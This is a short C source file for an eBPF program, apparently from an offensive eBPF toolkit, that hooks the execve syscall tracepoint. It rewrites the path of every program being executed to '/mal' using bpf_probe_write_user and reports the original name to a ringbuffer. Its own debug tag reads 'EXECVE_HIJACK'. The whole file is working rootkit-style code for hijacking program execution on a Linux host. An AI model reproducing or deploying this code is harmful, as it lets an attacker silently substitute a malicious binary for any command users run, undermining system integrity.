// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct event {
    int pid;
    char comm[16];
    bool success;
};

SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    const char **args = (const char **)(ctx->args[1]);

    char prog_name[16];
    char prog_name_orig[16];
    __builtin_memset(prog_name, '\x00', 16);
    bpf_probe_read_user(&prog_name, 16, (void*)ctx->args[0]);
    bpf_probe_read_user(&prog_name_orig, 16, (void*)ctx->args[0]);
    prog_name[16 - 1] = '\x00';
    
    if (prog_name[1] == '\x00') {
        bpf_printk("[EXECVE_HIJACK] program name too small\n");
        return 0;
    }

    prog_name[0] = '/';
    prog_name[1] = 'm';
    prog_name[2] = 'a';
    prog_name[3] = 'l';
    for (int i = 4; i < 16 ; i++) {
        prog_name[i] = '\x00';
    }
    long ret = bpf_probe_write_user((void*)ctx->args[0], &prog_name, 16);

    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        for (int i = 0; i < 16; i++) {
            e->comm[i] = prog_name_orig[i];
        }
        bpf_ringbuf_submit(e, 0);
    }

    return 0;
}